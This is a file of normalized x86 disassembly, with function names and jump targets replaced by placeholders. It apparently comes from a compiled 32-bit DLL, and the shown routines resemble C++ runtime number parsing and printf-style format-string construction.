call sub_10007dbd
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10004a57
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_10005c3c
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_100070e4
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10005db8
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10005c53
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_100070e4
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100065ea
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_1000264e
jmp r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_100041ef
push 0x38
mov eax sub_1004ed3d
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1000539c
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10007dbd
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10022859
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_100042be
push 0x38
mov eax sub_1004ed3d
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1000539c
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10007dbd
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10022859
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_10004389
push 0x38
mov eax sub_1004ed6a
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1000539c
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100229f4
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_10004437
push 0x38
mov eax sub_1004ed6a
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1000539c
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022859
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_100044e5
push 0x3c
mov eax sub_1004f450
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1000539c
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022a99
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_1000459c
push 0x3c
mov eax sub_1004f450
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1000539c
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022b5c
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_10004653
push 0x50
mov eax sub_1004ed97
call sub_1002b30f
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x50 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x54 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x50 ]
call sub_100056ec
add esp 0x14
push eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10022d61
fstp [ ebp - 0x50 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x58 ]
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x5c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
fld [ ebp - 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_1002b392
retn 0x20
sub_100046fb
push 0x54
mov eax sub_10050028
call sub_1002b30f
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_100056ec
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10022d83
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_1002b392
retn 0x20
sub_100047a3
push 0x54
mov eax sub_10050028
call sub_1002b30f
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_100056ec
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10022dec
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_1002b392
retn 0x20
sub_1000484b
push 0x38
mov eax sub_1004f47d
call sub_1002b30f
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1000539c
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10007dbd
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022859
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_1002b392
retn 0x20
sub_1000491e
push 0xc
mov eax sub_10051571
call sub_1002b2a6
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ edi + eax ] r--data
mov eax [ edi ]
mov [ edi + 0x4 ] ebx
mov esi [ eax + 0x4 ]
add esi edi
call sub_1000718d
mov eax [ ebp + 0xc ]
mov [ esi + 0x28 ] eax
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ esi + 0x2c ] ebx
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10007a4d
pop ecx
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] bl
call sub_10007dbd
mov ecx [ ebp - 0x10 ]
mov eax [ ecx ]
push 0x20
call [ eax + 0x28 ]
mov [ esi + 0x30 ] ax
cmp [ esi + 0x28 ] ebx
jne r-xdata
mov [ esi + 0x4 ] ebx
mov eax edi
call sub_1002b37e
retn 0x8
mov eax [ esi + 0x8 ]
or eax 0x4
push ebx
push esi
mov ecx eax
call sub_100080a5
sub_100049ac
push 0x0
mov eax sub_1004fa36
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_10021d39
xor edi edi
push 0x4
mov [ ebp - 0x4 ] edi
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor eax eax
mov ecx eax
call sub_1000736c
jmp r-xdata
mov [ esi + 0x38 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea ecx [ esi + 0x1c ]
mov [ esi + 0x24 ] ecx
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x34 ] ecx
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ esi + 0x34 ]
mov [ eax ] edi
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] edi
mov eax esi
call sub_1002b37e
retn 0x4
sub_10004a7d
push ebx
mov ebx eax
mov eax [ esi + 0x40 ]
and eax 0x6
cmp al 0x6
je r-xdata
pop ebx
retn 0x4
push edi
push 0x0
push ebx
call sub_10002399
push ebx
push [ esp + 0x18 ]
mov edi eax
push ebx
push edi
call sub_10002614
lea eax [ ebx + ebx ]
add esp 0x18
test [ esi + 0x40 ] 0x4
lea ecx [ eax + edi ]
mov [ esi + 0x3c ] ecx
jne r-xdata
mov edx [ esi + 0x40 ]
test dl 0x2
jne r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] edi
mov edx [ esi + 0x20 ]
mov [ edx ] edi
mov ebx [ esi + 0x30 ]
mov edx eax
sar edx 0x1
mov [ ebx ] edx
or [ esi + 0x40 ] 0x1
pop edi
test dl 0x10
jne r-xdata
mov edx [ esi + 0x14 ]
mov [ edx ] edi
mov edx [ esi + 0x24 ]
sub eax ecx
mov [ edx ] ecx
mov ecx [ esi + 0x34 ]
add eax edi
sar eax 0x1
mov [ ecx ] eax
mov eax [ esi + 0x20 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx edi
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
sar edi 0x1
mov [ eax ] edi
sub_10004b0d
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test bl 0x20
je r-xdata
test bl 0x10
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov dl [ esp + 0x10 ]
mov [ ecx ] 0x2e
inc ecx
mov [ ecx ] 0x2a
inc ecx
test dl dl
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov edx 0x3000
and ebx edx
cmp ebx 0x2000
jne r-xdata
mov [ ecx ] dl
inc ecx
cmp ebx edx
jne r-xdata
mov dl 0x66
jmp r-xdata
cmp ebx 0x1000
setne dl
lea edx [ edx + edx + 0x65 ]
mov dl 0x61
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
retn
sub_10004b71
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fff8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x68 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x80 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ esp + 0x38 ] eax
lea eax [ esp + 0x3c ]
push eax
mov [ esp + 0x28 ] ecx
call sub_10007dd5
and [ esp + 0x88 ] 0x0
push eax
call sub_1000654d
or [ esp + 0x8c ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ esp + 0x3c ]
mov [ esp + 0x30 ] ebx
call sub_10007dbd
lea eax [ esp + 0x5c ]
push eax
mov ecx ebx
call sub_10005f61
mov [ esp + 0x88 ] 0x1
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
xor ebx ebx
push ebx
lea ecx [ esp + 0x44 ]
mov [ esp + 0x2c ] eax
mov [ esp + 0x5c ] 0xf
call sub_100021a7
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
mov [ esp + 0x94 ] 0x2
call sub_10007340
movzx eax ax
mov [ esp + 0x2c ] eax
mov al [ esi ]
add esp 0xc
cmp al 0x2b
je r-xdata
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x2c ] ebx
cmp al 0x2d
jne r-xdata
cmp [ esp + 0x74 ] 0x10
mov eax [ esp + 0x60 ]
jae r-xdata
mov [ ebp + 0x2c ] ebx
call sub_10027b31
mov eax [ eax ]
push [ ebp + 0x30 ]
mov al [ eax ]
push 0x65
push esi
mov [ esp + 0x20 ] al
mov [ esp + 0x21 ] 0x65
mov [ esp + 0x22 ] 0x0
call sub_10027b60
push [ ebp + 0x30 ]
mov [ esp + 0x20 ] eax
movsx eax [ esp + 0x24 ]
push eax
push esi
call sub_10027b60
add esp 0x18
mov [ esp + 0x18 ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ esp + 0x60 ]
mov ecx [ ebp + 0x28 ]
mov eax [ ebp + 0x24 ]
mov edx [ esp + 0x24 ]
add eax ecx
add eax [ ebp + 0x2c ]
mov ecx [ edx + 0x18 ]
add eax [ ebp + 0x30 ]
cmp ecx ebx
jle r-xdata
cmp [ esp + 0x74 ] 0x10
mov eax [ esp + 0x60 ]
jae r-xdata
mov [ esp + 0x10 ] ebx
cmp ecx eax
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ esp + 0x60 ]
movsx eax [ esp + 0x14 ]
push [ ebp + 0x30 ]
push eax
push esi
call sub_10027b60
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax 0x100
jne r-xdata
sub ecx eax
mov [ esp + 0x10 ] ecx
jmp r-xdata
push [ ebp + 0x30 ]
lea ecx [ esp + 0x44 ]
push esi
call sub_100072a4
mov eax [ esp + 0x10 ]
cmp eax ebx
jne r-xdata
push [ ebp + 0x30 ]
push 0x65
push esi
call sub_10027b60
add esp 0xc
cmp eax ebx
je r-xdata
push [ esp + 0x28 ]
sub eax esi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ esp + 0x28 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10005e8e
mov ecx [ eax ]
push [ ebp + 0x24 ]
mov [ ebp + 0x10 ] ecx
push [ esp + 0x40 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x44 ]
push eax
push edi
call sub_10005373
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ esp + 0x64 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
movzx eax ax
push 0x1
push eax
push [ ebp + 0x14 ]
lea eax [ esp + 0x3c ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10005373
mov ecx [ eax ]
push [ ebp + 0x28 ]
mov [ ebp + 0x10 ] ecx
push [ esp + 0x3c ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x58 ]
push eax
push edi
call sub_10005373
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x30
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
push [ esp + 0x10 ]
lea eax [ esp + 0x1c ]
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10005373
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ esp + 0x28 ] ebx
mov [ ebp + 0x14 ] eax
add esp 0x18
cmp [ esp + 0x2c ] ebx
jbe r-xdata
mov eax [ edx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
cmp [ esp + 0x18 ] ebx
jne r-xdata
push 0x30
push [ ebp + 0x2c ]
lea ecx [ esp + 0x48 ]
call sub_100014aa
jmp r-xdata
push [ esp + 0x28 ]
lea eax [ esp + 0x34 ]
push [ ebp + 0x30 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10005e8e
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
push [ esp + 0x40 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x44 ]
push eax
push edi
call sub_10005373
mov ecx [ eax ]
push [ esp + 0x44 ]
mov edx [ esp + 0x5c ]
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ esp + 0x7c ]
mov [ ebp + 0x14 ] eax
push edi
mov [ edx + 0x18 ] ebx
call sub_10005373
add esp 0x4c
push ebx
push 0x1
lea ecx [ esp + 0x48 ]
call sub_100020e2
push ebx
push 0x1
lea ecx [ esp + 0x64 ]
call sub_100020e2
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x80 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x68 ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn
push [ esp + 0x28 ]
sub eax esi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ esp + 0x40 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10005e8e
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
push [ esp + 0x40 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x5c ]
push eax
push edi
call sub_10005373
mov ecx [ eax ]
and [ ebp + 0x2c ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
mov ecx [ esp + 0x58 ]
add esp 0x34
test [ ecx + 0x10 ] 0x4
mov ecx r--data
jne r-xdata
push 0x1
push esi
